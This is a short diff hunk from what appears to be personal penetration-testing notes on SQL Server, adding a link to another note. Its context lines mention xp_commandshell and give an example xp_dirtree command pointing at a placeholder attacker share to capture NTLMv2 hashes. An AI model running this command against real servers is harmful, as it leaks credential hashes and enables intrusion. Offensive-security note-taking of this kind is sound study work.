@@ -23,6 +23,8 @@
   - `xp_commandshell`
   - capture NTLMv2 hashes `EXEC xp_dirtree '\\attacker.ip\share'`
 
+` zet/20221003151204/README.md `
+
 # Related
 
 
